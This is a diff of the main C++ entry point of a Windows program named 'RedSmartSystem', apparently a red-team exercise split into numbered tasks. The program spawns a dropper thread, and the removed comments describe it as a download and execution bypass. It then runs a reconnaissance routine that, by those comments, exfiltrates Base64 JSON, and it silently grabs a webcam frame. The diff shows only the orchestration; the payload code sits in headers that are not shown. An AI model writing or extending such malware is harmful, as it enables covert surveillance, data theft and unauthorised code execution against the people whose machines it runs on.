@@ -1,57 +1,60 @@
 #include <windows.h>
 #include <fstream>
+#include <string>
+#include <gdiplus.h>
+
+#pragma comment(lib, "gdiplus.lib")
+#pragma comment(lib, "windowscodecs.lib")
+#pragma comment(lib, "mfplat.lib")
+#pragma comment(lib, "mfreadwrite.lib")
+#pragma comment(lib, "mfuuid.lib")
+#pragma comment(lib, "ole32.lib")
+
+using namespace Gdiplus;
+
 #include "../Task 1/dropper.h"
 #include "../Task 2/recon.h"
 #include "../Task 3/camera.h"
 
-// Helper function to append to debug_log.txt
 static void LogMainDebug(const char* msg) {
     std::ofstream ofs("debug_log.txt", std::ios::app);
-    if (ofs.is_open()) {
-        ofs << "[Main] " << msg << std::endl;
-    }
+    if (ofs.is_open()) ofs << "[Main] " << msg << std::endl;
 }
+
+extern DWORD WINAPI DropperThread(LPVOID lpParam);
 
 int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
     LogMainDebug("--- RedSmartSystem Started ---");
 
-    // Initialize COM early for WMI (Task 2) and Camera (Task 3)
+    ULONG_PTR gdiplusToken = 0;
+    GdiplusStartupInput gdiplusStartupInput;
+    if (GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL) != Ok) {
+        LogMainDebug("GdiplusStartup failed to initialize.");
+        gdiplusToken = 0;
+    }
+
     HRESULT hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
     if (FAILED(hr)) {
-        LogMainDebug("CoInitializeEx failed! Some tasks may fail.");
+        LogMainDebug("CoInitializeEx failed.");
     } else {
-        // Initialize security so WMI can work smoothly
         CoInitializeSecurity(NULL, -1, NULL, NULL, RPC_C_AUTHN_LEVEL_DEFAULT, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_NONE, NULL);
     }
 
-    // 1. Task 1 - Background thread download / execution bypass
-    LogMainDebug("Executing DownloadPutty...");
-    if (DownloadPutty()) {
-        LogMainDebug("DownloadPutty thread successfully spawned.");
-    } else {
-        LogMainDebug("Failed to spawn DownloadPutty thread.");
-    }
+    HANDLE hThread = CreateThread(NULL, 0, DropperThread, NULL, 0, NULL);
+    if (hThread) CloseHandle(hThread);
 
-    // 2. Task 2 - Recon and Exfiltrate Base64 JSON
-    LogMainDebug("Executing CollectAndSendData...");
-    if (CollectAndSendData()) {
-        LogMainDebug("CollectAndSendData completed successfully.");
-    } else {
-        LogMainDebug("CollectAndSendData failed.");
-    }
+    CollectAndSendData();
 
-    // 3. Task 3 - Silently snag webcam frame
-    LogMainDebug("Executing CaptureWebcam...");
     if (CaptureWebcam()) {
-        LogMainDebug("CaptureWebcam completed successfully.");
+        LogMainDebug("CaptureWebcam returned Success!");
     } else {
-        LogMainDebug("CaptureWebcam failed.");
+        LogMainDebug("CaptureWebcam returned Failure.");
     }
 
-    if (SUCCEEDED(hr)) {
-        CoUninitialize();
-    }
+    if (SUCCEEDED(hr)) CoUninitialize();
     
+    if (gdiplusToken) GdiplusShutdown(gdiplusToken);
+
     LogMainDebug("--- RedSmartSystem Finished ---");
     return 0;
 }
